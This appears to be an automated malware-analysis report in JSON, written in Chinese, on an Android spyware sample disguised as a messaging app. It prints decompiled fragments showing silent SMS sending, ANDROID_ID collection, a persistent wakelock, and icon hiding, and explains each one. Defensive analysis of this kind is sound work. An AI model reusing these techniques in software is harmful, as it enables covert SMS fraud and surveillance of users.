@@ -1,0 +1,148 @@
+{
+  "APK信息": {
+    "文件名": "6618ae15cb179b4e0d85fde68a8337629cfc7328d75f2a973cdb3fe9cd598184.apk",
+    "sha256": "6618ae15cb179b4e0d85fde68a8337629cfc7328d75f2a973cdb3fe9cd598184",
+    "包名": "com.challenge.pedestrian",
+    "应用名": "СМC - Пoслание",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 163.8
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\challenge\\pedestrian\\a;",
+          "method_signature": "a(String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static void a(String str, String str2, PendingIntent pendingIntent) {\n    try {\n        Sofa.a(true);\n        SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n    } catch (Exception e) {\n    }\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static void a(String str, String str2, PendingIntent pendingIntent) {\n>>>         try {\n>>>             Sofa.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n>>>         }\n>>>     }\n  \n      public static boolean a(Context context) {\n          return Build.VERSION.SDK_INT < 19 || \"com.challenge.pedestrian\".equals(Telephony.Sms.getDefaultSmsPackage(context));",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 在后台静默发送短信，目标号码(str)和短信内容(str2)均来自方法参数，由恶意程序上层逻辑（结合厂商报告，该样本伪装成 Messages 应用并利用 AccessibilityService 窃取/操控设备）控制，无需用户知情或确认即可发出短信，典型用于短信欺诈、订阅扣费或向C2回传数据。发送前调用 Sofa.a(true) 设置标志位，异常被空catch静默吞掉以规避崩溃和检测。同类方法 a(Context) 还判断 SDK<19 或自身是否为默认短信应用，用于选择静默发送/写短信库的路径，进一步佐证其短信欺诈意图。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\challenge\\pedestrian\\a;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "return Settings.Secure.getString(context.getContentResolver(), \"android_id\");",
+          "malicious_code_snippet_context": "      }\n  \n      public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n      }\n  \n      private static void c(Context context, long j) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString 从系统设置中读取 ANDROID_ID（设备级唯一64位标识符），实现设备指纹采集。数据流向：系统 Settings.Secure 内容提供程序（source）→ 应用读取该持久化设备标识并返回给调用方（sink）。在已确认的恶意样本上下文中（该样本伪装成短信应用、滥用 AccessibilityService 并隐藏自身以监视受害者），该标识符用于唯一标识和追踪受害者设备，是间谍软件隐私窃取链条中的指纹采集环节。此外同文件另一重载方法还包含基于约9.7秒时间间隔静默拉起 Essential Activity 的隐蔽启动逻辑，与采集行为配合。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\challenge\\pedestrian\\Husband;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    startForegroundService(b());\n} else {\n    startService(b());\n}\nthis.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"Accountant\");\nthis.b.setReferenceCounted(false);\nthis.b.acquire();",
+          "malicious_code_snippet_context": "                  new e(Husband.this.getApplicationContext(), 77).a(\"t\", Log.getStackTraceString(th)).a();\n              }\n          });\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             startForegroundService(b());\n>>>         } else {\n>>>             startService(b());\n>>>         }\n>>>         registerReceiver(new BraidOvercharge(), new IntentFilter(\"status\"));\n>>>         this.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"Accountant\");\n>>>         this.b.setReferenceCounted(false);\n          this.b.acquire();\n          a.a(getApplicationContext(), System.currentTimeMillis());\n          HandlerThread handlerThread = new HandlerThread(\"Eagle\");",
+          "behavior_description": "在 Application.onCreate() 中，应用进程启动时立即无条件启动后台/前台服务（Android 8.0+ 使用 startForegroundService 规避后台服务限制）实现进程保活；同时通过 PowerManager 获取 PARTIAL_WAKE_LOCK 并调用 acquire() 且不设超时、不释放，使 CPU 持续唤醒，防止服务被系统休眠或杀死。数据流向：Build.VERSION.SDK_INT（系统版本判断）→ startForegroundService() 启动保活服务；PowerManager（系统电源服务）→ WakeLock.acquire() 持久持锁。结合厂商报告确认该样本为伪装成'短信'应用、滥用 AccessibilityService 的间谍软件，此保活机制确保恶意服务在受害者设备上持续驻留运行，为后续监控行为提供持久化支撑。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\challenge\\pedestrian\\ElbowSwop;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) ElbowSwop.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class ElbowSwop extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) ElbowSwop.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该 Activity 在 onCreate 中立即调用 a()，通过 PackageManager.setComponentEnabledSetting 将自身（启动器入口组件 ElbowSwop）设置为 COMPONENT_ENABLED_STATE_DISABLED（参数 2），使应用图标从桌面启动器中消失，随后调用 finish() 静默关闭界面。数据流向：getApplicationContext() 与 ElbowSwop.class 构造 ComponentName（source，组件标识）→ setComponentEnabledSetting(..., 2, 1)（sink，禁用组件导致图标隐藏）。这是 Android 恶意样本典型的图标隐藏/自我隐藏技术，用于躲避用户察觉与卸载，与厂商报告中该样本'隐藏自身以监视受害者'的描述完全吻合。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
